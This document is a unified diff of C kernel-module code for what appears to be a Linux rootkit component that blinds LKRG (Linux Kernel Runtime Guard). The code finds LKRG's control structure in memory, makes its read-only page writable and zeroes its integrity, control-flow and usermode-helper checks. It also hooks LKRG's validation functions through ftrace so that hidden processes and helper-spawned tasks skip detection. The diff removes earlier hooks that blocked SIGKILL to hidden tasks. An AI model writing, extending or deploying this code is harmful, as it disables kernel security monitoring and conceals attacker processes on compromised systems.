@@ -7,90 +7,167 @@ static atomic_t hooks_active = ATOMIC_INIT(0);
 static atomic_t umh_bypass_active = ATOMIC_INIT(0);
 static struct notifier_block module_notifier;
 
+#define LKRG_SETUP_DELAY_MS 1000
+
 static char lkrg_log_buf[512];
 static DEFINE_SPINLOCK(lkrg_log_lock);
 
-static void *p_lkrg_global_ctrl_ptr = NULL;
-
-#define LKRG_CTRL_UMH_VALIDATE_OFFSET  0x30
-#define LKRG_CTRL_UMH_ENFORCE_OFFSET   0x34
-#define LKRG_CTRL_PINT_VALIDATE_OFFSET 0x08
-#define LKRG_CTRL_PINT_ENFORCE_OFFSET  0x0c
-
-static unsigned int saved_umh_validate = 1;
-static unsigned int saved_umh_enforce = 1;
-static unsigned int saved_pint_validate = 3;
-static unsigned int saved_pint_enforce = 1;
-static DEFINE_SPINLOCK(lkrg_ctrl_lock);
-
-static notrace bool find_lkrg_ctrl(void)
-{
-    if (p_lkrg_global_ctrl_ptr)
-        return true;
-    
-    p_lkrg_global_ctrl_ptr = resolve_sym("p_lkrg_global_ctrl");
-    return p_lkrg_global_ctrl_ptr != NULL;
-}
-
-static notrace void disable_lkrg_umh_protection(void)
-{
-    unsigned int *umh_validate, *umh_enforce;
-    unsigned int *pint_validate, *pint_enforce;
-    unsigned long flags;
-    
-    if (!p_lkrg_global_ctrl_ptr && !find_lkrg_ctrl())
-        return;
-    
-    spin_lock_irqsave(&lkrg_ctrl_lock, flags);
-    
-    umh_validate = (unsigned int *)((char *)p_lkrg_global_ctrl_ptr + LKRG_CTRL_UMH_VALIDATE_OFFSET);
-    umh_enforce = (unsigned int *)((char *)p_lkrg_global_ctrl_ptr + LKRG_CTRL_UMH_ENFORCE_OFFSET);
-    pint_validate = (unsigned int *)((char *)p_lkrg_global_ctrl_ptr + LKRG_CTRL_PINT_VALIDATE_OFFSET);
-    pint_enforce = (unsigned int *)((char *)p_lkrg_global_ctrl_ptr + LKRG_CTRL_PINT_ENFORCE_OFFSET);
-    
-    saved_umh_validate = *umh_validate;
-    saved_umh_enforce = *umh_enforce;
-    saved_pint_validate = *pint_validate;
-    saved_pint_enforce = *pint_enforce;
-    
-    *umh_validate = 0;
-    *umh_enforce = 0;
-    *pint_validate = 0;
-    *pint_enforce = 0;
-    
-    spin_unlock_irqrestore(&lkrg_ctrl_lock, flags);
-}
-
-static notrace void restore_lkrg_umh_protection(void)
-{
-    unsigned int *umh_validate, *umh_enforce;
-    unsigned int *pint_validate, *pint_enforce;
-    unsigned long flags;
-    
-    if (!p_lkrg_global_ctrl_ptr)
-        return;
-    
-    spin_lock_irqsave(&lkrg_ctrl_lock, flags);
-    
-    umh_validate = (unsigned int *)((char *)p_lkrg_global_ctrl_ptr + LKRG_CTRL_UMH_VALIDATE_OFFSET);
-    umh_enforce = (unsigned int *)((char *)p_lkrg_global_ctrl_ptr + LKRG_CTRL_UMH_ENFORCE_OFFSET);
-    pint_validate = (unsigned int *)((char *)p_lkrg_global_ctrl_ptr + LKRG_CTRL_PINT_VALIDATE_OFFSET);
-    pint_enforce = (unsigned int *)((char *)p_lkrg_global_ctrl_ptr + LKRG_CTRL_PINT_ENFORCE_OFFSET);
-    
-    *umh_validate = saved_umh_validate;
-    *umh_enforce = saved_umh_enforce;
-    *pint_validate = saved_pint_validate;
-    *pint_enforce = saved_pint_enforce;
-    
-    spin_unlock_irqrestore(&lkrg_ctrl_lock, flags);
-}
-
 static const char *lkrg_symbols[] = {
-    "p_lkrg_global_ctrl",
+    "p_ro",
     "p_cmp_creds",
     "p_check_integrity",
     NULL
 };
+
+struct lkrg_ctrl_conf {
+#if defined(CONFIG_X86)
+    unsigned int p_smep_validate;
+    unsigned int p_smap_validate;
+#endif
+    unsigned int p_pcfi_validate;
+    unsigned int p_pint_validate;
+    unsigned int p_kint_validate;
+    unsigned int p_log_level;
+    unsigned int p_block_modules;
+    unsigned int p_msr_validate;
+    unsigned int p_heartbeat;
+    unsigned int p_interval;
+    unsigned int p_umh_validate;
+#if defined(CONFIG_X86)
+    unsigned int p_smep_enforce;
+    unsigned int p_smap_enforce;
+#endif
+    unsigned int p_pcfi_enforce;
+    unsigned int p_pint_enforce;
+    unsigned int p_kint_enforce;
+    unsigned int p_trigger;
+    unsigned int p_hide_lkrg;
+    unsigned int p_umh_enforce;
+    unsigned int p_profile_validate;
+    unsigned int p_profile_enforce;
+};
+
+struct lkrg_ro_view {
+#if !defined(CONFIG_ARM) && defined(CONFIG_X86)
+    unsigned long marker_np1 __attribute__((aligned(PAGE_SIZE)));
+#endif
+    struct {
+        struct lkrg_ctrl_conf ctrl;
+    } p_lkrg_global_ctrl __attribute__((aligned(PAGE_SIZE)));
+};
+
+static struct lkrg_ctrl_conf saved_lkrg_ctrl;
+static struct lkrg_ctrl_conf *lkrg_ctrl;
+static bool lkrg_ctrl_saved;
+static int (*set_memory_rw_fn)(unsigned long addr, int numpages);
+static int (*set_memory_ro_fn)(unsigned long addr, int numpages);
+static void lkrg_setup_workfn(struct work_struct *work);
+static DECLARE_DELAYED_WORK(lkrg_setup_work, lkrg_setup_workfn);
+
+static notrace bool lkrg_ctrl_plausible(struct lkrg_ctrl_conf *ctrl)
+{
+    if (!ctrl)
+        return false;
+
+    if (ctrl->p_pcfi_validate > 9 || ctrl->p_pint_validate > 9 ||
+        ctrl->p_kint_validate > 9 || ctrl->p_umh_validate > 9 ||
+        ctrl->p_pcfi_enforce > 9 || ctrl->p_pint_enforce > 9 ||
+        ctrl->p_kint_enforce > 9 || ctrl->p_umh_enforce > 9 ||
+        ctrl->p_profile_validate > 9 || ctrl->p_profile_enforce > 9 ||
+        ctrl->p_log_level > 9)
+        return false;
+
+    return true;
+}
+
+static notrace struct lkrg_ctrl_conf *lkrg_find_ctrl(void)
+{
+    void *ro = resolve_sym("p_ro");
+    struct lkrg_ctrl_conf *ctrl;
+
+    if (!ro)
+        return NULL;
+
+    ctrl = &((struct lkrg_ro_view *)ro)->p_lkrg_global_ctrl.ctrl;
+    if (lkrg_ctrl_plausible(ctrl))
+        return ctrl;
+
+    ctrl = (struct lkrg_ctrl_conf *)ro;
+    if (lkrg_ctrl_plausible(ctrl))
+        return ctrl;
+
+    return NULL;
+}
+
+static notrace bool lkrg_ctrl_make_rw(void *addr)
+{
+    unsigned long page = (unsigned long)addr & PAGE_MASK;
+
+    if (!set_memory_rw_fn)
+        set_memory_rw_fn = (void *)resolve_sym("set_memory_rw");
+    if (!set_memory_rw_fn)
+        return false;
+
+    return set_memory_rw_fn(page, 1) == 0;
+}
+
+static notrace void lkrg_ctrl_make_ro(void *addr)
+{
+    unsigned long page = (unsigned long)addr & PAGE_MASK;
+
+    if (!set_memory_ro_fn)
+        set_memory_ro_fn = (void *)resolve_sym("set_memory_ro");
+    if (set_memory_ro_fn)
+        set_memory_ro_fn(page, 1);
+}
+
+static notrace bool lkrg_relax_controls(void)
+{
+    struct lkrg_ctrl_conf *ctrl;
+
+    ctrl = lkrg_find_ctrl();
+    if (!ctrl)
+        return false;
+    lkrg_ctrl = ctrl;
+
+    if (!ctrl->p_pint_validate && !ctrl->p_pint_enforce &&
+        !ctrl->p_pcfi_validate && !ctrl->p_pcfi_enforce &&
+        !ctrl->p_umh_validate && !ctrl->p_umh_enforce)
+        return true;
+
+    if (!lkrg_ctrl_saved) {
+        memcpy(&saved_lkrg_ctrl, ctrl, sizeof(saved_lkrg_ctrl));
+        lkrg_ctrl_saved = true;
+    }
+
+    if (!lkrg_ctrl_make_rw(ctrl))
+        return false;
+
+    WRITE_ONCE(ctrl->p_pint_validate, 0);
+    WRITE_ONCE(ctrl->p_pint_enforce, 0);
+    WRITE_ONCE(ctrl->p_pcfi_validate, 0);
+    WRITE_ONCE(ctrl->p_pcfi_enforce, 0);
+    WRITE_ONCE(ctrl->p_umh_validate, 0);
+    WRITE_ONCE(ctrl->p_umh_enforce, 0);
+    lkrg_ctrl_make_ro(ctrl);
+
+    return true;
+}
+
+static notrace void lkrg_restore_controls(void)
+{
+    if (!lkrg_ctrl || !lkrg_ctrl_saved)
+        return;
+
+    lkrg_ctrl_make_rw(lkrg_ctrl);
+    WRITE_ONCE(lkrg_ctrl->p_pint_validate, saved_lkrg_ctrl.p_pint_validate);
+    WRITE_ONCE(lkrg_ctrl->p_pint_enforce, saved_lkrg_ctrl.p_pint_enforce);
+    WRITE_ONCE(lkrg_ctrl->p_pcfi_validate, saved_lkrg_ctrl.p_pcfi_validate);
+    WRITE_ONCE(lkrg_ctrl->p_pcfi_enforce, saved_lkrg_ctrl.p_pcfi_enforce);
+    WRITE_ONCE(lkrg_ctrl->p_umh_validate, saved_lkrg_ctrl.p_umh_validate);
+    WRITE_ONCE(lkrg_ctrl->p_umh_enforce, saved_lkrg_ctrl.p_umh_enforce);
+    lkrg_ctrl_make_ro(lkrg_ctrl);
+}
 
 static notrace bool is_lkrg_present(void)
 {
@@ -127,6 +204,16 @@ static notrace bool is_lineage_hidden(struct task_struct *task)
 static notrace bool should_hide_task(struct task_struct *task)
 {
     return task ? is_lineage_hidden(task) : false;
+}
+
+static notrace bool should_skip_lkrg_ed(void)
+{
+    lkrg_relax_controls();
+
+    if (atomic_read(&umh_bypass_active) > 0)
+        return true;
+
+    return should_hide_task(current);
 }
 
 static notrace pid_t extract_pid_from_log(const char *msg)
@@ -201,62 +288,15 @@ static notrace asmlinkage int hook_vprintk_emit(int facility, int level,
     return orig_vprintk_emit(facility, level, dev_info, fmt, args);
 }
 
-static int (*orig_do_send_sig_info)(int sig, struct kernel_siginfo *info,
-    struct task_struct *p, enum pid_type type) = NULL;
-
-static notrace int hook_do_send_sig_info(int sig, struct kernel_siginfo *info,
-    struct task_struct *p, enum pid_type type)
-{
-    if (sig == SIGKILL && p && should_hide_task(p))
-        return 0;
-    return orig_do_send_sig_info ? orig_do_send_sig_info(sig, info, p, type) : 0;
-}
-
-static int (*orig_send_sig_info)(int sig, struct kernel_siginfo *info,
-    struct task_struct *p) = NULL;
-
-static notrace int hook_send_sig_info(int sig, struct kernel_siginfo *info,
-    struct task_struct *p)
-{
-    if (sig == SIGKILL && p && should_hide_task(p))
-        return 0;
-    return orig_send_sig_info ? orig_send_sig_info(sig, info, p) : 0;
-}
-
-static int (*orig___send_signal_locked)(int sig, struct kernel_siginfo *info,
-    struct task_struct *t, enum pid_type type, bool force) = NULL;
-
-static notrace int hook___send_signal_locked(int sig, struct kernel_siginfo *info,
-    struct task_struct *t, enum pid_type type, bool force)
-{
-    if (sig == SIGKILL && t && should_hide_task(t))
-        return 0;
-    return orig___send_signal_locked ? 
-        orig___send_signal_locked(sig, info, t, type, force) : 0;
-}
-
-static void (*orig_force_sig)(int sig) = NULL;
-
-static notrace void hook_force_sig(int sig)
-{
-    if (sig == SIGKILL && should_hide_task(current))
-        return;
-    
-    if (sig == SIGKILL && atomic_read(&umh_bypass_active) > 0)
-        return;
-    
-    if (orig_force_sig)
-        orig_force_sig(sig);
-}
-
 static int (*orig_call_usermodehelper_exec_async)(void *data) = NULL;
 
 static notrace int hook_call_usermodehelper_exec_async(void *data)
 {
     bool bypass_active = atomic_read(&umh_bypass_active) > 0;
+
+    lkrg_relax_controls();
     
     if (bypass_active) {
-        disable_lkrg_umh_protection();
         add_hidden_pid(current->pid);
         add_child_pid(current->pid);
     }
@@ -271,29 +311,85 @@ static notrace int hook_call_usermodehelper_exec(struct subprocess_info *sub_inf
 {
     int ret;
     bool bypass_active = atomic_read(&umh_bypass_active) > 0;
+
+    lkrg_relax_controls();
     
     if (bypass_active) {
-        disable_lkrg_umh_protection();
         add_hidden_pid(current->pid);
     }
     
     ret = orig_call_usermodehelper_exec ? 
         orig_call_usermodehelper_exec(sub_info, wait) : -ENOENT;
     
-    if (bypass_active)
-        restore_lkrg_umh_protection();
-    
     return ret;
+}
+
+static void (*orig_p_ed_enforce_validation)(void) = NULL;
+
+static notrace void hook_p_ed_enforce_validation(void)
+{
+    if (should_skip_lkrg_ed())
+        return;
+
+    if (orig_p_ed_enforce_validation)
+        orig_p_ed_enforce_validation();
+}
+
+static unsigned int (*orig_p_ed_enforce_validation_paranoid)(void) = NULL;
+
+static notrace unsigned int hook_p_ed_enforce_validation_paranoid(void)
+{
+    if (atomic_read(&umh_bypass_active) > 0 || hidden_pid_count() > 0 || child_pid_count() > 0)
+        return 0;
+
+    return orig_p_ed_enforce_validation_paranoid ?
+        orig_p_ed_enforce_validation_paranoid() : 0;
+}
+
+static void (*orig_p_ed_validate_current)(void *p_source) = NULL;
+
+static notrace void hook_p_ed_validate_current(void *p_source)
+{
+    if (should_skip_lkrg_ed())
+        return;
+
+    if (orig_p_ed_validate_current)
+        orig_p_ed_validate_current(p_source);
+}
+
+static void (*orig_p_ed_validate_off_flag_wrap)(void *p_source) = NULL;
+
+static notrace void hook_p_ed_validate_off_flag_wrap(void *p_source)
+{
+    if (should_skip_lkrg_ed())
+        return;
+
+    if (orig_p_ed_validate_off_flag_wrap)
+        orig_p_ed_validate_off_flag_wrap(p_source);
+}
+
+static int (*orig_p_ed_enforce_pcfi)(struct task_struct *task, void *orig,
+    struct pt_regs *regs) = NULL;
+
+static notrace int hook_p_ed_enforce_pcfi(struct task_struct *task, void *orig,
+    struct pt_regs *regs)
+{
+    if (atomic_read(&umh_bypass_active) > 0 || should_hide_task(task ? task : current))
+        return 0;
+
+    return orig_p_ed_enforce_pcfi ?
+        orig_p_ed_enforce_pcfi(task, orig, regs) : 0;
 }
 
 static struct ftrace_hook lkrg_hooks[] = {
     HOOK("vprintk_emit", hook_vprintk_emit, &orig_vprintk_emit),
-    HOOK("do_send_sig_info", hook_do_send_sig_info, &orig_do_send_sig_info),
-    HOOK("send_sig_info", hook_send_sig_info, &orig_send_sig_info),
-    HOOK("__send_signal_locked", hook___send_signal_locked, &orig___send_signal_locked),
-    HOOK("force_sig", hook_force_sig, &orig_force_sig),
     HOOK("call_usermodehelper_exec_async", hook_call_usermodehelper_exec_async, &orig_call_usermodehelper_exec_async),
     HOOK("call_usermodehelper_exec", hook_call_usermodehelper_exec, &orig_call_usermodehelper_exec),
+    HOOK("p_ed_enforce_validation", hook_p_ed_enforce_validation, &orig_p_ed_enforce_validation),
+    HOOK("p_ed_enforce_validation_paranoid", hook_p_ed_enforce_validation_paranoid, &orig_p_ed_enforce_validation_paranoid),
+    HOOK("p_ed_validate_current", hook_p_ed_validate_current, &orig_p_ed_validate_current),
+    HOOK("p_ed_validate_off_flag_wrap", hook_p_ed_validate_off_flag_wrap, &orig_p_ed_validate_off_flag_wrap),
+    HOOK("p_ed_enforce_pcfi", hook_p_ed_enforce_pcfi, &orig_p_ed_enforce_pcfi),
 };
 
 static notrace int try_install_hooks(void)
@@ -324,25 +420,31 @@ static notrace void remove_hooks(void)
     atomic_set(&hooks_active, 0);
 }
 
+static void lkrg_setup_workfn(struct work_struct *work)
+{
+    if (!is_lkrg_present())
+        return;
+
+    lkrg_relax_controls();
+    try_install_hooks();
+    lkrg_relax_controls();
+}
+
 static notrace int module_notify(struct notifier_block *nb, unsigned long action, void *data)
 {
     struct module *mod = data;
     
     if (!mod) return NOTIFY_DONE;
-    
-    if (action == MODULE_STATE_LIVE && strstr(mod->name, "lkrg")) {
-        msleep(2000);
-        find_lkrg_ctrl();
-    }
+
+    if (action == MODULE_STATE_LIVE && strstr(mod->name, "lkrg"))
+        schedule_delayed_work(&lkrg_setup_work, msecs_to_jiffies(LKRG_SETUP_DELAY_MS));
+
     return NOTIFY_DONE;
 }
 
 notrace void enable_umh_bypass(void)
 {
     atomic_inc(&umh_bypass_active);
-    
-    if (p_lkrg_global_ctrl_ptr || find_lkrg_ctrl())
-        disable_lkrg_umh_protection();
 }
 EXPORT_SYMBOL(enable_umh_bypass);
 
@@ -350,9 +452,6 @@ notrace void disable_umh_bypass(void)
 {
     if (atomic_read(&umh_bypass_active) > 0)
         atomic_dec(&umh_bypass_active);
-    
-    if (atomic_read(&umh_bypass_active) == 0 && p_lkrg_global_ctrl_ptr)
-        restore_lkrg_umh_protection();
 }
 EXPORT_SYMBOL(disable_umh_bypass);
 
@@ -363,23 +462,19 @@ notrace bool is_lkrg_blinded(void)
 
 notrace int lkrg_bypass_init(void)
 {
-    try_install_hooks();
-    
     module_notifier.notifier_call = module_notify;
     register_module_notifier(&module_notifier);
-    
-    if (is_lkrg_present())
-        find_lkrg_ctrl();
+
+    lkrg_setup_workfn(NULL);
     
     return 0;
 }
 
 notrace void lkrg_bypass_exit(void)
 {
-    if (p_lkrg_global_ctrl_ptr && atomic_read(&umh_bypass_active) > 0)
-        restore_lkrg_umh_protection();
-    
+    cancel_delayed_work_sync(&lkrg_setup_work);
     unregister_module_notifier(&module_notifier);
     remove_hooks();
+    lkrg_restore_controls();
     atomic_set(&umh_bypass_active, 0);
 }
